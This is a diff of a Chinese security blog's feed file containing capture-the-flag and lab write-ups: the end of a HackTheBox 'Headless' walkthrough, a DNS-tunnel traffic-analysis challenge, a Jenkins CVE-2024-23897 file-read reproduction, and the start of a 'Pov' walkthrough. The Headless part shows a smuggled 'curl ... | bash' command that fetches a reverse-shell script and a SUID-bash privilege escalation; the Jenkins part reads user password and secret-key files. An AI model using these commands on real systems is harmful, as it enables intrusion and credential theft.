+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date=;curl 10.10.14.34/shell.sh |bash</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>成功反弹shell</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331175715080.png"></p>
+<p>得到user的flag</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331175800113.png"></p>
+<p>我们尝试用sudo提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p>发现只有<code>/usr/bin/syscheck</code>可用</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331180740517.png"></p>
+<p>我们strings命令查看下得到源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">if [ &quot;$EUID&quot; -ne 0 ]; then</span><br><span class="line">  exit 1</span><br><span class="line">last_modified_time=$(/usr/bin/find /boot -name &#x27;vmlinuz*&#x27; -exec stat -c %Y &#123;&#125; + | /usr/bin/sort -n | /usr/bin/tail -n 1)</span><br><span class="line">formatted_time=$(/usr/bin/date -d &quot;@$last_modified_time&quot; +&quot;%d/%m/%Y %H:%M&quot;)</span><br><span class="line">/usr/bin/echo &quot;Last Kernel Modification Time: $formatted_time&quot;</span><br><span class="line">disk_space=$(/usr/bin/df -h / | /usr/bin/awk &#x27;NR==2 &#123;print $4&#125;&#x27;)</span><br><span class="line">/usr/bin/echo &quot;Available disk space: $disk_space&quot;</span><br><span class="line">load_average=$(/usr/bin/uptime | /usr/bin/awk -F&#x27;load average:&#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">/usr/bin/echo &quot;System load average: $load_average&quot;</span><br><span class="line">if ! /usr/bin/pgrep -x &quot;initdb.sh&quot; &amp;&gt;/dev/null; then</span><br><span class="line">  /usr/bin/echo &quot;Database service is not running. Starting it...&quot;</span><br><span class="line">  ./initdb.sh 2&gt;/dev/null</span><br><span class="line">else</span><br><span class="line">  /usr/bin/echo &quot;Database service is running.&quot;</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
+
+<p>重点看下面这段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ! /usr/bin/pgrep -x &quot;initdb.sh&quot; &amp;&gt;/dev/null; then</span><br><span class="line">  /usr/bin/echo &quot;Database service is not running. Starting it...&quot;</span><br><span class="line">  ./initdb.sh 2&gt;/dev/null</span><br><span class="line">else</span><br><span class="line">  /usr/bin/echo &quot;Database service is running.&quot;</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
+
+<p>这段代码大概意思就是，if语句先使用pgrep命令检测<code>initdb.sh</code>是否存在，如果不存在则执行该sh文件并丢弃错误输出</p>
+<p>而我们在根目录下并没有找到该sh文件，那么我们可以简单利用一下</p>
+<ol>
+<li><p>首先创建<code>initdb.sh</code>文件，写入提升权限的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;chmod u+s /bin/bash&quot; &gt; initdb.sh</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然后赋予该sh脚本的执行权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x initdb.sh</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>最后sudo执行<code>/usr/bin/syscheck</code>，成功运行sh脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/syscheck</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p><img src="/article/Headless-HackTheBox/image-20240331181954932.png"></p>
+<p>运行sh脚本后，用-p参数启动<code>Bash Shell</code>并以特权模式运行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/bash -p</span><br></pre></td></tr></table></figure>
+
+<p>得到root的flag</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331182210478.png"></p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>HackTheBox</tag>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hospital-HackTheBox</title>
     <url>/article/Hospital-HackTheBox.html</url>
-    <content><![CDATA[<p>Ubuntu内核版本漏洞提权、CVE-2023-36664</p>
+    <content><![CDATA[<p>Ubuntu内核版本漏洞提权、Artifex Software Ghostscript 安全漏洞</p>
 <span id="more"></span>
 
 <h1 id="Hospital-HackTheBox"><a href="#Hospital-HackTheBox" class="headerlink" title="Hospital-HackTheBox"></a>Hospital-HackTheBox</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>nmap扫描一下端口</p>
@@ -870,7 +870,7 @@
 <p><img src="/article/Hospital-HackTheBox/image-20240115200651567.png"></p>
 <p>谷歌翻译一下，应该是要给Brown发送.eps文件</p>
 <p><img src="/article/Hospital-HackTheBox/image-20240115200710233.png"></p>
-<p>网上搜索出相关漏洞 <a href="https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection">参考文章</a></p>
+<p>网上搜索出相关漏洞–Artifex Software Ghostscript 安全漏洞(CVE-2023-36664) <a href="https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection">参考文章</a></p>
 <blockquote>
 <p>漏洞原理大概就是GPL PostScript&#x2F;PDF 解释器 Ghostscript 无法正确处理管道设备的权限验证，如果处理格式错误的文档文件，可能会导致执行任意命令</p>
 </blockquote>
@@ -914,6 +914,7 @@
       <tags>
         <tag>HackTheBox</tag>
         <tag>提权</tag>
+        <tag>Windows</tag>
       </tags>
   </entry>
   <entry>
@@ -987,109 +988,6 @@
         <tag>HackTheBox</tag>
         <tag>提权</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>ISCC2024-数据泄露</title>
-    <url>/article/ISCC2024-%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2.html</url>
-    <content><![CDATA[<p>ISCC2024擂台赛的一道流量分析题，和内网渗透中搭建隧道事件有关</p>
-<span id="more"></span>
-
-<h2 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a>数据泄露</h2><p><strong>题目要求</strong></p>
-<blockquote>
-<p>公司主机被攻击了，请根据流量文件，找到攻击者所使用的 DNS 隧道工具的原始文件名。请提交文件名的小写md5</p>
-</blockquote>
-<p>打开文件发现存在大量DNS的数据包，筛选一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dns &amp;&amp; ip.src==192.168.157.144</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503205838886.png" alt="image-20240503205838886"></p>
-<p>发现这些包非常大，并且对应域名过长</p>
-<p><strong>明显的 dnscat2 流量特征（解析域名过长，使用 CNAME、TXT、MX 记录的查询）</strong></p>
-<p>我们导出为纯文本文件</p>
-<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210020711.png" alt="image-20240503210020711"></p>
-<p>将域名<code>microsofto365.com</code>前面部分提取出来（就提取的前面几部分）</p>
-<p>解码脚本如下 <a href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&tid=265941">参考文章</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hex_string=&#x27;1ae6012ec72fe4b1f14d6963726f736f66742057696e646f7773205b5665&#x27;</span><br><span class="line">hex_string=hex_string.replace(&#x27;.&#x27;,&#x27;&#x27;)</span><br><span class="line">#将字符按照每两个字符分组，转换成十六进制数</span><br><span class="line">hex_parts=[hex_string[i:i+2] for i in range(0,len(hex_string),2)]</span><br><span class="line"></span><br><span class="line">#转换成ascii字符</span><br><span class="line">ascii_result=&#x27;&#x27;.join(chr(int(hex,16)) for hex in hex_parts)</span><br><span class="line">print(ascii_result)</span><br></pre></td></tr></table></figure>
-
-<p>运行结果如下</p>
-<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210239942.png" alt="image-20240503210239942"></p>
-<p>注意到DNS隧道工具dnscat2，不过有乱码</p>
-<p>直接搜索引擎确定文件名</p>
-<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210351782.png" alt="image-20240503210351782"></p>
-<p>然后在线网站MD5加密一下，上面那个就是flag</p>
-<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210412841.png" alt="image-20240503210412841"></p>
-]]></content>
-      <categories>
-        <category>流量分析</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Jenkins文件读取漏洞(CVE-2024-23897)</title>
-    <url>/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897.html</url>
-    <content><![CDATA[<p>最近实在不知道做什么，跟着p神复现下比较火的漏洞</p>
-<span id="more"></span>
-
-<h1 id="Jenkins文件读取漏洞-CVE-2024-23897"><a href="#Jenkins文件读取漏洞-CVE-2024-23897" class="headerlink" title="Jenkins文件读取漏洞(CVE-2024-23897)"></a>Jenkins文件读取漏洞(CVE-2024-23897)</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>用的是vulhub靶场的环境 <a href="https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897">下载地址</a></p>
-<p>cd进入目录下，依次执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker-compose ps -a</span><br></pre></td></tr></table></figure>
-
-<p>访问8080端口即可</p>
-<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Jenkins提供了一个命令行的接口，用户可以下载一个命令行客户端<code>jenkins-cli.jar</code>到本地，并调用该客户端来执行一些Jenkins的功能。但是用户使用<code>jenkins-cli.jar</code>时，命令行是传到服务端解析的，而不是在jenkins-cli.jar里解析。这就导致一个问题，就是Jenkins服务端解析命令行时使用了一个第三方库<a href="https://github.com/kohsuke/args4j">args4j</a>，这个库实现了Linux中一个常见的功能——如果一个参数是以<code>@</code>开头，则会被自动认为是一个文件名，文件内容会被读取作为参数。所以就造成Jenkins文件读取漏洞。</p>
-<blockquote>
-<p>类似的还有PHP5.5以前，设置POST参数时，如果传入的参数值是<code>@</code>开头，则也会被认为是文件名，并读取该文件，造成文件读取漏洞。</p>
-</blockquote>
-<h2 id="Jenkins权限系统"><a href="#Jenkins权限系统" class="headerlink" title="Jenkins权限系统"></a>Jenkins权限系统</h2><p>正常情况下，cli这个功能的权限控制方案和Jenkins默认权限方案相同</p>
-<p>Jenkins有几种鉴权方案：</p>
-<ul>
-<li><strong>Anyone can do anything</strong> 没有任何权限认证，匿名用户即可登录后台执行Groovy脚本</li>
-<li><strong>Legacy Mode</strong> 旧鉴权模式</li>
-<li><strong>Logged-in users can do anything</strong> 任意登录的用户可以做任何事，这是默认的权限选项</li>
-<li><strong>Matrix-based security</strong> 细颗粒度权限控制，需要安装插件才支持这个鉴权模式</li>
-</ul>
-<p>默认安装后是第3种方案，非常简单，没有垂直权限的区分，登录后的用户就是管理员，没有登录的用户就是匿名用户。</p>
-<p>这种权限方案中，管理员可以设置“匿名用户可读”选项：</p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408215237335.png"></p>
-<p>这个选项在后台的<code>“Manage Jenkins” -&gt; “Security”</code>中管理员可以将其开启或关闭，默认是关闭的。实际测试中，如果我们访问Jenkins首页，发现强制跳转到登录页面，或者啥功能都没有直接报权限错误，就说明关闭了“匿名用户读”选项。</p>
-<p>我们不妨测试一下关闭了匿名用户可读功能，那么大部分的cli命令也就无法调用，会出现<code>&quot;ERROR: anonymous is missing the Overall/Read permission&quot;</code>的错误：</p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408215426442.png"></p>
-<p>但有2个命令例外，就是help和who-am-i。这两个命令是无需任何权限的，所以可以用来读取文件</p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408215733356.png"></p>
-<p>在Vulhub环境中，“匿名用户可读”是开启的，某些Jenkins版本默认安装时可能也是开启的，但通常管理员会关闭这个功能。另外，大部分企业的Jenkins会安装<code>“Matrix-based security”</code>这样的插件来管理权限，也会影响“匿名用户可读”选项的值。总而言之，这个选项的开关取决于管理员是否想让未登录用户看到一些Jenkins的任务。</p>
-<p>总结一下就是：</p>
-<ul>
-<li>当Jenkins开启了“匿名用户可读”功能，大部分命令都可以被调用</li>
-<li>当Jenkins关闭了“匿名用户可读”功能，只有help和who-am-i命令可以被调用</li>
-</ul>
-<h2 id="如何读取想要的内容"><a href="#如何读取想要的内容" class="headerlink" title="如何读取想要的内容"></a>如何读取想要的内容</h2><p>前文已经知道了文件读取漏洞的原理，利用<code>jenkins-cli.jar</code>将命令传到服务端解析借助args4j库特性解析参数有<code>@</code>开头的文件</p>
-<p>要实现任意文件读取，那么就需要返回文件读取后的内容。利用点是如果调用命令行的时候出错，args4j就会把错误返回给客户端而错误信息中就包含文件的内容。</p>
-<p>这里p神提到，如果我们使用<code>@</code>将文件内容加载成命令行参数，那么我们读取文件的时候只能读到文件的前几行</p>
-<p>比如使用help命令能读取前两行</p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408220700887.png"></p>
-<p>使用keep-build命令，可以读取文件第3行</p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408220816201.png"></p>
-<p>读取几行内容终究是不够，前文提到如果Jenkins开启了“匿名用户可读”选项，则大部分命令都可以被调用，其中包括<code>connect-node</code>命令和<code>reload-job</code>命令。这俩命令可以用来读取文件全部内容</p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408221213026.png"></p>
-<h2 id="Jenkins敏感文件"><a href="#Jenkins敏感文件" class="headerlink" title="Jenkins敏感文件"></a>Jenkins敏感文件</h2><p>如果部署Jenkins是Vulhub的Docker镜像，那么Jenkins的数据根目录是在<code>/var/jenkins_home</code>。但并不是所有人都会使用这个目录作为根目录，如果想读取Jenkins相关的文件，必须先知道Jenkins的根目录在哪里。这时可以读取<code>/proc/self/environ</code>也就是环境变量</p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408222401625.png"></p>
-<p>拿到了Jenkins的根目录，我们就可以来尝试读取下面这些敏感文件。</p>
-<ul>
-<li><code>/var/jenkins_home/users/*/config.xml</code> 保存所有用户的信息，包括密码、种子、Token等</li>
-<li><code>/var/jenkins_home/secret.key</code> 保存Remember-Me Cookie中的一部分</li>
-<li><code>/var/jenkins_home/secrets/master.key</code> 作为AES解密密钥</li>
-<li><code>/var/jenkins_home/secrets/org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices.mac</code> 作为计算hmac签名时的Key</li>
-</ul>
-<h3 id="读取用户密码"><a href="#读取用户密码" class="headerlink" title="读取用户密码"></a>读取用户密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jenkins-cli.jar -s http://localhost:8080/ -http reload-job &quot;@/var/jenkins_home/users/users.xml&quot;</span><br></pre></td></tr></table></figure>
-
-<p>得到用户名<code>admin_6382705393240952219</code></p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408222722527.png"></p>
-<p>接着读取到用户密码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jenkins-cli.jar -s http://localhost:8080/ -http reload-job &quot;@/var/jenkins_home/users/admin_6382705393240952219/config.xml&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408222813856.png"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>跟着p神复现热门漏洞可以说是非常有收获，c1oudfl0w0师傅说RWCTF2024有道题考的就是这个漏洞，可惜当时没去打hhh</p>
-]]></content>
-      <categories>
-        <category>漏洞分析</category>
-      </categories>
   </entry>
   <entry>
     <title>Logjammer-HackTheBox</title>
@@ -1168,6 +1066,40 @@
         <tag>HackTheBox</tag>
         <tag>Windows</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>ISCC2024-数据泄露</title>
+    <url>/article/ISCC2024-%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2.html</url>
+    <content><![CDATA[<p>ISCC2024擂台赛的一道流量分析题，和内网渗透中搭建隧道事件有关</p>
+<span id="more"></span>
+
+<h2 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a>数据泄露</h2><p><strong>题目要求</strong></p>
+<blockquote>
+<p>公司主机被攻击了，请根据流量文件，找到攻击者所使用的 DNS 隧道工具的原始文件名。请提交文件名的小写md5</p>
+</blockquote>
+<p>打开文件发现存在大量DNS的数据包，筛选一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dns &amp;&amp; ip.src==192.168.157.144</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503205838886.png" alt="image-20240503205838886"></p>
+<p>发现这些包非常大，并且对应域名过长</p>
+<p><strong>明显的 dnscat2 流量特征（解析域名过长，使用 CNAME、TXT、MX 记录的查询）</strong></p>
+<p>我们导出为纯文本文件</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210020711.png" alt="image-20240503210020711"></p>
+<p>将域名<code>microsofto365.com</code>前面部分提取出来（就提取的前面几部分）</p>
+<p>解码脚本如下 <a href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&tid=265941">参考文章</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hex_string=&#x27;1ae6012ec72fe4b1f14d6963726f736f66742057696e646f7773205b5665&#x27;</span><br><span class="line">hex_string=hex_string.replace(&#x27;.&#x27;,&#x27;&#x27;)</span><br><span class="line">#将字符按照每两个字符分组，转换成十六进制数</span><br><span class="line">hex_parts=[hex_string[i:i+2] for i in range(0,len(hex_string),2)]</span><br><span class="line"></span><br><span class="line">#转换成ascii字符</span><br><span class="line">ascii_result=&#x27;&#x27;.join(chr(int(hex,16)) for hex in hex_parts)</span><br><span class="line">print(ascii_result)</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210239942.png" alt="image-20240503210239942"></p>
+<p>注意到DNS隧道工具dnscat2，不过有乱码</p>
+<p>直接搜索引擎确定文件名</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210351782.png" alt="image-20240503210351782"></p>
+<p>然后在线网站MD5加密一下，上面那个就是flag</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210412841.png" alt="image-20240503210412841"></p>
+]]></content>
+      <categories>
+        <category>流量分析</category>
+      </categories>
   </entry>
   <entry>
     <title>Meerkat-HackTheBox</title>
@@ -1251,6 +1183,75 @@
       <tags>
         <tag>HackTheBox</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Jenkins文件读取漏洞(CVE-2024-23897)</title>
+    <url>/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897.html</url>
+    <content><![CDATA[<p>最近实在不知道做什么，跟着p神复现下比较火的漏洞</p>
+<span id="more"></span>
+
+<h1 id="Jenkins文件读取漏洞-CVE-2024-23897"><a href="#Jenkins文件读取漏洞-CVE-2024-23897" class="headerlink" title="Jenkins文件读取漏洞(CVE-2024-23897)"></a>Jenkins文件读取漏洞(CVE-2024-23897)</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>用的是vulhub靶场的环境 <a href="https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897">下载地址</a></p>
+<p>cd进入目录下，依次执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker-compose ps -a</span><br></pre></td></tr></table></figure>
+
+<p>访问8080端口即可</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Jenkins提供了一个命令行的接口，用户可以下载一个命令行客户端<code>jenkins-cli.jar</code>到本地，并调用该客户端来执行一些Jenkins的功能。但是用户使用<code>jenkins-cli.jar</code>时，命令行是传到服务端解析的，而不是在jenkins-cli.jar里解析。这就导致一个问题，就是Jenkins服务端解析命令行时使用了一个第三方库<a href="https://github.com/kohsuke/args4j">args4j</a>，这个库实现了Linux中一个常见的功能——如果一个参数是以<code>@</code>开头，则会被自动认为是一个文件名，文件内容会被读取作为参数。所以就造成Jenkins文件读取漏洞。</p>
+<blockquote>
+<p>类似的还有PHP5.5以前，设置POST参数时，如果传入的参数值是<code>@</code>开头，则也会被认为是文件名，并读取该文件，造成文件读取漏洞。</p>
+</blockquote>
+<h2 id="Jenkins权限系统"><a href="#Jenkins权限系统" class="headerlink" title="Jenkins权限系统"></a>Jenkins权限系统</h2><p>正常情况下，cli这个功能的权限控制方案和Jenkins默认权限方案相同</p>
+<p>Jenkins有几种鉴权方案：</p>
+<ul>
+<li><strong>Anyone can do anything</strong> 没有任何权限认证，匿名用户即可登录后台执行Groovy脚本</li>
+<li><strong>Legacy Mode</strong> 旧鉴权模式</li>
+<li><strong>Logged-in users can do anything</strong> 任意登录的用户可以做任何事，这是默认的权限选项</li>
+<li><strong>Matrix-based security</strong> 细颗粒度权限控制，需要安装插件才支持这个鉴权模式</li>
+</ul>
+<p>默认安装后是第3种方案，非常简单，没有垂直权限的区分，登录后的用户就是管理员，没有登录的用户就是匿名用户。</p>
+<p>这种权限方案中，管理员可以设置“匿名用户可读”选项：</p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408215237335.png"></p>
+<p>这个选项在后台的<code>“Manage Jenkins” -&gt; “Security”</code>中管理员可以将其开启或关闭，默认是关闭的。实际测试中，如果我们访问Jenkins首页，发现强制跳转到登录页面，或者啥功能都没有直接报权限错误，就说明关闭了“匿名用户读”选项。</p>
+<p>我们不妨测试一下关闭了匿名用户可读功能，那么大部分的cli命令也就无法调用，会出现<code>&quot;ERROR: anonymous is missing the Overall/Read permission&quot;</code>的错误：</p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408215426442.png"></p>
+<p>但有2个命令例外，就是help和who-am-i。这两个命令是无需任何权限的，所以可以用来读取文件</p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408215733356.png"></p>
+<p>在Vulhub环境中，“匿名用户可读”是开启的，某些Jenkins版本默认安装时可能也是开启的，但通常管理员会关闭这个功能。另外，大部分企业的Jenkins会安装<code>“Matrix-based security”</code>这样的插件来管理权限，也会影响“匿名用户可读”选项的值。总而言之，这个选项的开关取决于管理员是否想让未登录用户看到一些Jenkins的任务。</p>
+<p>总结一下就是：</p>
+<ul>
+<li>当Jenkins开启了“匿名用户可读”功能，大部分命令都可以被调用</li>
+<li>当Jenkins关闭了“匿名用户可读”功能，只有help和who-am-i命令可以被调用</li>
+</ul>
+<h2 id="如何读取想要的内容"><a href="#如何读取想要的内容" class="headerlink" title="如何读取想要的内容"></a>如何读取想要的内容</h2><p>前文已经知道了文件读取漏洞的原理，利用<code>jenkins-cli.jar</code>将命令传到服务端解析借助args4j库特性解析参数有<code>@</code>开头的文件</p>
+<p>要实现任意文件读取，那么就需要返回文件读取后的内容。利用点是如果调用命令行的时候出错，args4j就会把错误返回给客户端而错误信息中就包含文件的内容。</p>
+<p>这里p神提到，如果我们使用<code>@</code>将文件内容加载成命令行参数，那么我们读取文件的时候只能读到文件的前几行</p>
+<p>比如使用help命令能读取前两行</p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408220700887.png"></p>
+<p>使用keep-build命令，可以读取文件第3行</p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408220816201.png"></p>
+<p>读取几行内容终究是不够，前文提到如果Jenkins开启了“匿名用户可读”选项，则大部分命令都可以被调用，其中包括<code>connect-node</code>命令和<code>reload-job</code>命令。这俩命令可以用来读取文件全部内容</p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408221213026.png"></p>
+<h2 id="Jenkins敏感文件"><a href="#Jenkins敏感文件" class="headerlink" title="Jenkins敏感文件"></a>Jenkins敏感文件</h2><p>如果部署Jenkins是Vulhub的Docker镜像，那么Jenkins的数据根目录是在<code>/var/jenkins_home</code>。但并不是所有人都会使用这个目录作为根目录，如果想读取Jenkins相关的文件，必须先知道Jenkins的根目录在哪里。这时可以读取<code>/proc/self/environ</code>也就是环境变量</p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408222401625.png"></p>
+<p>拿到了Jenkins的根目录，我们就可以来尝试读取下面这些敏感文件。</p>
+<ul>
+<li><code>/var/jenkins_home/users/*/config.xml</code> 保存所有用户的信息，包括密码、种子、Token等</li>
+<li><code>/var/jenkins_home/secret.key</code> 保存Remember-Me Cookie中的一部分</li>
+<li><code>/var/jenkins_home/secrets/master.key</code> 作为AES解密密钥</li>
+<li><code>/var/jenkins_home/secrets/org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices.mac</code> 作为计算hmac签名时的Key</li>
+</ul>
+<h3 id="读取用户密码"><a href="#读取用户密码" class="headerlink" title="读取用户密码"></a>读取用户密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jenkins-cli.jar -s http://localhost:8080/ -http reload-job &quot;@/var/jenkins_home/users/users.xml&quot;</span><br></pre></td></tr></table></figure>
+
+<p>得到用户名<code>admin_6382705393240952219</code></p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408222722527.png"></p>
+<p>接着读取到用户密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jenkins-cli.jar -s http://localhost:8080/ -http reload-job &quot;@/var/jenkins_home/users/admin_6382705393240952219/config.xml&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408222813856.png"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>跟着p神复现热门漏洞可以说是非常有收获，c1oudfl0w0师傅说RWCTF2024有道题考的就是这个漏洞，可惜当时没去打hhh</p>
+]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>Monitored-HackTheBox</title>
@@ -1681,6 +1682,138 @@
       </tags>
   </entry>
   <entry>
+    <title>Pov-HackTheBox</title>
+    <url>/article/Pov-HackTheBox.html</url>
+    <content><![CDATA[<p>AST.NET框架ViewState参数攻击、LFI本地文件包含漏洞、ysoserial反序列化漏洞、SeDebugPrivilege提权</p>
+<span id="more"></span>
+
+<h1 id="Pov-HackTheBox"><a href="#Pov-HackTheBox" class="headerlink" title="Pov-HackTheBox"></a>Pov-HackTheBox</h1><p><strong>信息搜集</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v --min-rate 1000 10.10.11.251</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE    VERSION</span><br><span class="line">80/tcp open  tcpwrapped</span><br><span class="line">|_http-title: pov.htb</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD</span><br></pre></td></tr></table></figure>
+
+<p>我们将域名<code>pov.htb</code>添加到<code>/etc/hosts</code>方便访问</p>
+<p>打开后发现是企业网站，扫出来子域名<code>dev.pov.htb</code></p>
